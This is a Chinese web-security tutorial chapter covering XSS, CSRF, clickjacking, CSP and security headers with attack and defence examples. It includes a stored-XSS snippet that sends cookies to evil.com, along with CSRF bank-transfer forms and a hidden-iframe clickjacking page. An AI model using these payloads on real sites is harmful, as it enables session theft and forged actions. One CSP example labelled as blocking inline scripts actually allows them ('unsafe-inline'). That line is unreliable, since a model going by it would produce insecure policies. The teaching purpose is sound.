---
title: "第十四章：浏览器安全基础"
description: "XSS、CSRF、CSP、安全最佳实践"
---

# 第十四章：浏览器安全基础

## Web 安全概述

Web 安全是保护网站和用户数据免受攻击的重要领域。

### 安全威胁类型

| 类型 | 说明 | 影响 |
| --- | --- | --- |
| XSS | 跨站脚本攻击 | 窃取用户数据 |
| CSRF | 跨站请求伪造 | 执行恶意操作 |
| 点击劫持 | 诱导用户点击 | 执行未知操作 |
| SQL 注入 | 数据库攻击 | 数据泄露 |
| 中间人攻击 | 窃听通信 | 数据泄露 |

## XSS 攻击

XSS（Cross-Site Scripting）跨站脚本攻击，攻击者注入恶意脚本到网页中。

### XSS 类型

| 类型 | 特点 | 场景 |
| --- | --- | --- |
| 存储型 | 脚本存储在服务器 | 评论、论坛 |
| 反射型 | 脚本在 URL 中 | 搜索、错误页面 |
| DOM 型 | 脚本修改 DOM | 前端路由 |

### 攻击示例

**存储型 XSS**：
```html
<!-- 恶意评论 -->
<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie);
</script>
```

**反射型 XSS**：
```
http://example.com/search?q=<script>alert('XSS')</script>
```

### 防御措施

| 方法 | 说明 |
| --- | --- |
| 输入过滤 | 过滤特殊字符 |
| 输出转义 | HTML 实体编码 |
| CSP | 内容安全策略 |
| HttpOnly | Cookie 不可被 JS 读取 |

```javascript
// 输出转义
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return str.replace(/[&<>"']/g, m => map[m]);
}
```

## CSRF 攻击

CSRF（Cross-Site Request Forgery）跨站请求伪造，攻击者诱导用户执行非预期操作。

### 攻击原理

1. 用户登录目标网站
2. 用户访问恶意网站
3. 恶意网站发起跨域请求
4. 浏览器自动携带 Cookie
5. 目标网站误认为是用户操作

### 攻击示例

```html
<!-- 恶意网站 -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">

<!-- 或 -->
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

### 防御措施

| 方法 | 说明 |
| --- | --- |
| CSRF Token | 随机令牌验证 |
| SameSite Cookie | 限制跨站 Cookie |
| 验证 Referer | 检查请求来源 |
| 二次验证 | 敏感操作需确认 |

```javascript
// 生成 CSRF Token
const crypto = require('crypto');
const token = crypto.randomBytes(32).toString('hex');

// 表单中添加 Token
<form method="POST">
  <input type="hidden" name="_csrf" value="<%= token %>">
</form>
```

## 点击劫持

点击劫持通过透明 iframe 诱导用户点击隐藏的按钮。

### 攻击示例

```html
<!-- 恶意网站 -->
<style>
  iframe {
    position: absolute;
    opacity: 0;
    z-index: -1;
  }
</style>

<iframe src="http://bank.com/delete-account"></iframe>

<button>点击领取奖品</button>
```

### 防御措施

```http
# X-Frame-Options
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN

# CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
```

## CSP 内容安全策略

CSP（Content Security Policy）通过白名单控制资源加载。

### 配置方式

**HTTP 头部**：
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

**Meta 标签**：
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

### 常用指令

| 指令 | 说明 |
| --- | --- |
| default-src | 默认源 |
| script-src | 脚本源 |
| style-src | 样式源 |
| img-src | 图片源 |
| connect-src | 连接源 |
| font-src | 字体源 |
| frame-src | 框架源 |

### 示例

```http
# 只允许同源脚本
Content-Security-Policy: script-src 'self'

# 允许特定 CDN
Content-Security-Policy: script-src 'self' https://cdn.example.com

# 禁止内联脚本
Content-Security-Policy: script-src 'self' 'unsafe-inline'

# 使用 nonce
Content-Security-Policy: script-src 'self' 'nonce-abc123'
```

## 安全最佳实践

### 传输安全

| 实践 | 说明 |
| --- | --- |
| HTTPS | 加密传输 |
| HSTS | 强制 HTTPS |
| 证书固定 | 防止中间人攻击 |

### Cookie 安全

| 属性 | 说明 |
| --- | --- |
| Secure | 仅 HTTPS 传输 |
| HttpOnly | 禁止 JS 访问 |
| SameSite | 限制跨站发送 |

```http
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
```

### 其他建议

| 建议 | 说明 |
| --- | --- |
| 输入验证 | 服务端验证输入 |
| 输出编码 | 根据上下文编码 |
| 最小权限 | 限制权限范围 |
| 定期更新 | 修复安全漏洞 |
| 安全头 | 配置安全相关头部 |

## 安全头部

| 头部 | 作用 |
| --- | --- |
| X-Content-Type-Options | 禁止 MIME 嗅探 |
| X-Frame-Options | 防止点击劫持 |
| X-XSS-Protection | XSS 过滤 |
| Strict-Transport-Security | 强制 HTTPS |
| Content-Security-Policy | 内容安全策略 |
| Referrer-Policy | 控制 Referer |

## 本章小结

Web 安全涉及多个方面，XSS、CSRF、点击劫持是常见攻击方式。通过输入验证、输出转义、CSP、安全头部等措施可以有效防御。安全是一个持续的过程，需要时刻保持警惕。
